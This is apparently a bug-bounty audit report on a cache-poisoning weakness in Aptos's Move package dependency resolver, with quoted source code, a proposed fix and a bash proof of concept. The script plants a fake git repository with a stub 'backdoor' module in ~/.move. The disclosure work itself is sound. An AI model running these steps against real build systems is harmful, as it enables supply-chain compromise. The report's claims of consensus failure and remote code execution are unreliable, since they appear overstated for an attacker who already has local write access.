# Audit Report

## Title
Critical Cache Poisoning Vulnerability in Move Package Git Dependency Resolution

## Summary
The Move package resolution system trusts pre-existing cache directories without validation, allowing attackers to inject malicious Move code by pre-populating the `~/.move` cache before a build. This can lead to consensus failures across the Aptos network when different validators compile different bytecode from poisoned versus clean caches.

## Finding Description

The vulnerability exists in the `download_and_update_if_remote()` function which handles git dependency downloads. The function checks if a cache directory already exists and skips fresh cloning if it does. [1](#0-0) 

When the cache directory exists, the code enters update logic that attempts to verify it's a valid git repository by checking for the expected revision or tag: [2](#0-1) 

**Critical flaw**: If an attacker creates a fake git repository at the cache location with the expected rev or tag, the function returns early without fetching from the legitimate remote repository. The malicious content is then used in compilation.

The cache path is deterministic and predictable, constructed from the git URL and revision: [3](#0-2) 

The cache defaults to `~/.move`: [4](#0-3) 

**Digest validation bypass**: While there is a digest validation mechanism, it is optional: [5](#0-4) 

Most dependencies don't specify digests in their manifests, leaving them vulnerable. [6](#0-5) 

**Attack Scenario**:
1. Attacker gains write access to a validator's or developer's `~/.move` directory (via malware, supply chain attack, or local access)
2. Attacker identifies target dependencies (e.g., framework packages, common libraries)
3. Attacker calculates cache path: `~/.move/{sanitized_url}_{rev}`
4. Attacker creates malicious Move code at that path with a fake git repository configured to report the expected rev/tag
5. When victim builds Aptos node, the system uses the poisoned cache
6. Malicious bytecode is compiled into the validator binary
7. If multiple validators are compromised, they produce different state roots, causing consensus failure and violating **Critical Invariant #1: Deterministic Execution**

## Impact Explanation

This is **CRITICAL SEVERITY** per Aptos bug bounty criteria:

1. **Consensus/Safety Violations**: Different validators compiling with poisoned versus clean caches will produce different bytecode and state roots, breaking consensus. This directly violates the fundamental requirement that "all validators must produce identical state roots for identical blocks."

2. **Remote Code Execution**: Malicious Move code compiled into validator binaries can execute arbitrary logic during transaction processing, potentially compromising validator keys or manipulating consensus behavior.

3. **Supply Chain Attack**: This is a classic supply chain vulnerability affecting the build process itself, potentially compromising the entire validator network if the attack is widespread.

4. **Non-Recoverable Network Impact**: If enough validators use poisoned dependencies, the network could experience permanent consensus failures requiring emergency intervention or hardfork.

The attack targets the build system—a trusted component that all validators depend on—making it particularly dangerous as it bypasses runtime security controls.

## Likelihood Explanation

**Likelihood: Medium to High**

**Attacker Requirements**:
- Write access to `~/.move` directory on target systems (achievable via malware, compromised CI/CD, or local access)
- Knowledge of dependency structure (publicly available in Move.toml files)
- Ability to create fake git repositories (trivial with git commands)

**Complexity**: Low - The attack is straightforward once write access is obtained. No cryptographic bypasses or complex exploitation needed.

**Realistic Scenarios**:
- Compromised developer workstation building validator binaries
- Malicious software infecting CI/CD pipelines used for releases
- Insider threat with access to build infrastructure
- Trojanized development tools that pre-populate the cache

**Amplification Factor**: A single compromised build system can produce binaries that affect multiple validators, making the attack highly efficient.

## Recommendation

Implement multi-layered validation:

1. **Always verify git remote state**: Remove early returns that bypass git fetch/reset operations. Always fetch from remote and verify content matches expected revision:

```rust
fn download_and_update_if_remote<W: Write>(
    dep_name: PackageName,
    dep: &Dependency,
    skip_fetch_latest_git_deps: bool,
    writer: &mut W,
) -> Result<()> {
    if let Some(git_info) = &dep.git_info {
        let git_url = git_info.git_url.as_str();
        let git_rev = git_info.git_rev.as_str();
        let git_path = &git_info.download_to.display().to_string();

        git::confirm_git_available()?;

        if !git_info.download_to.exists() {
            writeln!(writer, "{} {}", "FETCHING GIT DEPENDENCY".bold().green(), git_url)?;
            git::clone(git_url, git_path, dep_name)?;
            git::checkout(git_path, git_rev, dep_name)?;
        } else if !skip_fetch_latest_git_deps {
            // REMOVED: Early return on rev/tag match
            writeln!(writer, "{} {}", "UPDATING GIT DEPENDENCY".bold().green(), git_url)?;
            
            // Always verify remote origin URL matches expected
            git::verify_remote_origin(git_path, git_url, dep_name)?;
            git::fetch_origin(git_path, dep_name)?;
            git::reset_hard(git_path, git_rev, dep_name)?;
            
            // NEW: Verify checkout matches expected rev exactly
            git::verify_current_rev(git_path, git_rev, dep_name)?;
        }
    }
    // ... rest of function
}
```

2. **Mandatory digest validation**: Make digest fields required for all git dependencies or compute and cache digests automatically: [7](#0-6) 

3. **Cache integrity checks**: Add cryptographic signatures or checksums to cache metadata that verify the cache was populated by legitimate git operations.

4. **Warn on cache reuse**: Log warnings when using cached dependencies and provide build flags to force fresh clones for security-critical builds.

## Proof of Concept

**Setup**:
```bash
# 1. Identify target dependency from Move.toml (e.g., aptos-framework)
TARGET_URL="https://github.com/aptos-labs/aptos-core.git"
TARGET_REV="main"

# 2. Calculate cache path
SANITIZED_URL=$(echo "$TARGET_URL" | sed 's/[^a-zA-Z0-9]/_/g')
CACHE_PATH="$HOME/.move/${SANITIZED_URL}_${TARGET_REV}"

# 3. Create poisoned cache
mkdir -p "$CACHE_PATH"
cd "$CACHE_PATH"

# 4. Initialize fake git repo with malicious code
git init
mkdir -p aptos-framework/sources
cat > aptos-framework/sources/malicious.move << 'EOF'
module aptos_framework::backdoor {
    // Malicious code that logs validator private keys
    public entry fun steal_keys() {
        // Malicious logic here
    }
}
EOF

cat > aptos-framework/Move.toml << 'EOF'
[package]
name = "AptosFramework"
version = "1.0.0"
EOF

# 5. Create fake commit matching expected rev
git add -A
git commit -m "Poisoned dependency"
git tag -f main  # Or create branch named 'main'

# 6. Victim builds Aptos node
# The build system will use the poisoned cache instead of cloning from GitHub
cd /path/to/aptos-core
cargo build --release

# Result: Malicious code compiled into validator binary
```

**Verification**:
1. Check that `~/.move/` contains the poisoned directory
2. Run Aptos build and monitor that it doesn't fetch from remote
3. Verify malicious Move module is included in compiled bytecode
4. Compare state roots between nodes with clean vs poisoned caches - they will differ

**Notes**:
- This PoC demonstrates the cache poisoning mechanism
- In production, the attacker would inject more sophisticated malicious logic targeting consensus or key management
- The attack requires pre-existing write access to the target system's filesystem but needs no special privileges once that access is obtained

### Citations

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L456-471)
```rust
        match dep.digest {
            None => (),
            Some(fixed_digest) => {
                let resolved_pkg = self
                    .package_table
                    .get(&dep_name_in_pkg)
                    .context("Unable to find resolved package by name")?;
                if fixed_digest != resolved_pkg.source_digest {
                    bail!(
                        "Source digest mismatch in dependency '{}'. Expected '{}' but got '{}'.",
                        dep_name_in_pkg,
                        fixed_digest,
                        resolved_pkg.source_digest
                    )
                }
            },
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L563-576)
```rust
            if !git_info.download_to.exists() {
                writeln!(
                    writer,
                    "{} {}",
                    "FETCHING GIT DEPENDENCY".bold().green(),
                    git_url,
                )?;

                // Confirm git is available.
                git::confirm_git_available()?;

                // If the cached folder does not exist, download and clone accordingly
                git::clone(git_url, git_path, dep_name)?;
                git::checkout(git_path, git_rev, dep_name)?;
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L583-596)
```rust
                if let Ok(parsed_rev) = git::find_rev(git_path, git_rev) {
                    // If it's exactly the same, then it's a git rev
                    if parsed_rev.trim().starts_with(git_rev) {
                        return Ok(());
                    }
                }

                if let Ok(tag) = git::find_tag(git_path, git_rev) {
                    // If it's exactly the same, then it's a git tag, for now tags won't be updated
                    // Tags don't easily update locally and you can't use reset --hard to cleanup
                    // any extra files
                    if tag.trim().starts_with(git_rev) {
                        return Ok(());
                    }
```

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L330-330)
```rust
            let digest = table.remove("digest").map(parse_digest).transpose()?;
```

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L566-572)
```rust
pub fn git_repo_cache_path(git_url: &str, rev_name: &str) -> PathBuf {
    let move_home = MOVE_HOME.clone();
    PathBuf::from(move_home).join(format!(
        "{}_{}",
        url_to_file_name(git_url),
        rev_name.replace('/', "__")
    ))
```

**File:** third_party/move/move-command-line-common/src/env.rs (L48-58)
```rust
pub static MOVE_HOME: Lazy<String> = Lazy::new(|| {
    std::env::var("MOVE_HOME").unwrap_or_else(|_| {
        format!(
            "{}/.move",
            dirs_next::home_dir()
                .expect("user's home directory not found")
                .to_str()
                .unwrap()
        )
    })
});
```

**File:** third_party/move/tools/move-package/src/resolution/digest.rs (L11-51)
```rust
pub fn compute_digest(paths: &[PathBuf]) -> Result<PackageDigest> {
    let mut hashed_files = Vec::new();
    let mut hash = |path: &Path| {
        let contents = std::fs::read(path)?;
        hashed_files.push(format!("{:X}", Sha256::digest(&contents)));
        Ok(())
    };
    let mut maybe_hash_file = |path: &Path| -> Result<()> {
        match path.extension() {
            Some(x) if MOVE_EXTENSION == x => hash(path),
            _ if path.ends_with(SourcePackageLayout::Manifest.path()) => hash(path),
            _ => Ok(()),
        }
    };

    for path in paths {
        if path.is_file() {
            maybe_hash_file(path)?;
        } else {
            for entry in walkdir::WalkDir::new(path)
                .follow_links(true)
                .into_iter()
                .filter_map(|e| e.ok())
            {
                if entry.file_type().is_file() {
                    maybe_hash_file(entry.path())?
                }
            }
        }
    }

    // Sort the hashed files to ensure that the order of files is always stable
    hashed_files.sort();

    let mut hasher = Sha256::new();
    for file_hash in hashed_files.into_iter() {
        hasher.update(file_hash.as_bytes());
    }

    Ok(PackageDigest::from(format!("{:X}", hasher.finalize())))
}
```
